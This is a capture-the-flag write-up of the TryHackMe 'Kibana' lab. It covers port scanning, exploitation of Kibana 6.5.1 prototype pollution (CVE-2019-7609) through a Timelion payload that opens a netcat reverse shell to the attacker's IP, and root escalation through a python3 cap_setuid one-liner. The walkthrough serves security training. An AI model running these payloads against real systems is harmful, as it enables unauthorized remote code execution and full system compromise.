* * *
 ### LAB: KIBANA
 ### PLATFORM: THM
* * *
![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/265763d7-294c-4777-adbf-b560b0da6ce4)

### ENUMERATION

- Rustscan's details
      
      Open 10.10.97.58:80
      Open 10.10.97.58:5044
      Open 10.10.97.58:5601
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      Discovered open port 22/tcp on 10.10.97.58
      Discovered open port 80/tcp on 10.10.97.58
      Discovered open port 5601/tcp on 10.10.97.58
      Discovered open port 5044/tcp on 10.10.97.58
      Completed Connect Scan at 02:14, 0.25s elapsed (4 total ports)
      Initiating Service scan at 02:14
      Scanning 4 services on 10.10.97.58
      Completed Service scan at 02:14, 27.85s elapsed (4 services on 1 host)
      NSE: Script scanning 10.10.97.58.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 02:14
      Completed NSE at 02:14, 10.90s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 02:14
      Completed NSE at 02:14, 0.57s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 02:14
      Completed NSE at 02:14, 0.00s elapsed
      Nmap scan report for 10.10.97.58
      Host is up, received syn-ack (0.24s latency).
      Scanned at 2024-01-27 02:14:07 EST for 39s
      
      PORT     STATE SERVICE      REASON  VERSION
      22/tcp   open  ssh          syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdVrdscXW6Eaq1+q+MgEBuU8ngjH5elzu6EOX2UJzNKcvAgxLrV0gCtWb4dJiJ2TyCLmA5lr0+8/TCInbcNfvXbmMEjxv0H3mi4Wjc/6wLECBXmEBvPX/SUyxPQb9YusTj70qGxgyI6SCB13TKftGeHOn2YRGLkudRF5ptIWYZqRnwlmYDWvuEBotWyUpfC1fGEnk7iH6gr3XJ8pwhY8wOojWaXEPsSZux3iBO52GuHILC14OiR/rQz9jxsq4brm6Zk/RhPCt1Ct/5ytsPzmUi7Nvwz6UoR6AeSRSHxOCnNBRQc2+5tFY7JMBBtvOFtbASOleILHkmTJBuRK3jth5D
      |   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2fQ/bb8Gwa5L5++T3T5JC7ZvciybYTlcWE9Djbzuco0f86gp3GOzTeVaDuhOWkR6J3fwxxwDWPk6k7NacceG0=
      |   256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk7PJIcjNmxjQK6/M1zKyptfTrUS2l0ZsELrO3prOA0
      80/tcp   open  http         syn-ack Apache httpd 2.4.18 ((Ubuntu))
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      |_http-title: Site doesn't have a title (text/html).
      5044/tcp open  lxi-evntsvc? syn-ack
      5601/tcp open  esmagent?    syn-ack
      | fingerprint-strings: 
      |   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
      |     HTTP/1.1 400 Bad Request
      |   FourOhFourRequest: 
      |     HTTP/1.1 503 Service Unavailable
      |     retry-after: 30
      |     content-type: text/html; charset=utf-8
      |     cache-control: no-cache
      |     content-length: 30
      |     Date: Fri, 26 Jan 2024 23:09:44 GMT
      |     Connection: close
      |     Kibana server is not ready yet
      |   GetRequest: 
      |     HTTP/1.1 503 Service Unavailable
      |     retry-after: 30
      |     content-type: text/html; charset=utf-8
      |     cache-control: no-cache
      |     content-length: 30
      |     Date: Fri, 26 Jan 2024 23:09:34 GMT
      |     Connection: close
      |     Kibana server is not ready yet
      |   HTTPOptions: 
      |     HTTP/1.1 503 Service Unavailable
      |     retry-after: 30
      |     content-type: text/html; charset=utf-8
      |     cache-control: no-cache
      |     content-length: 30
      |     Date: Fri, 26 Jan 2024 23:09:35 GMT
      |     Connection: close
      |_    Kibana server is not ready yet
      

- Port 5601 provides Kibana as a service and the version `6.5.1` is vulnerable to Prototype Pollution.Prototype pollution is a vulnerability that is specific to programming languages with prototype-based inheritance (the most common one being JavaScript)

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a80efcb8-a2b9-4f8a-8e5a-6f438d8049c1)

-   To gain rce with Timelion,I got this code from this <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">page</a> to gain rce,
  The code to get a rev shell
 `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.158.229 1337 >/tmp/f");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1924e4f4-6784-4093-ac93-b2ff81fc1e25)

- To activate the code,click on canvas,now we have a reverse shell
 
  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e04194d1-92df-402a-844c-ead917068c78)

### PRIVESC WITH CAPABILITIES

- To check for binaries with capabilities,use `getcap -r / 2</dev/null`,Python3 has a cap_setuid capabilities which will allow us to setuid of users

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/7a01dfb3-6384-425d-a712-31c0ecdad1ac)

- We can escalate privileges by setting the uid of our current user to 0 which is root,I used this payload   
  `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

- Root access
  
     ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3702df4b-927e-49e6-9dc3-251d7d730b76)
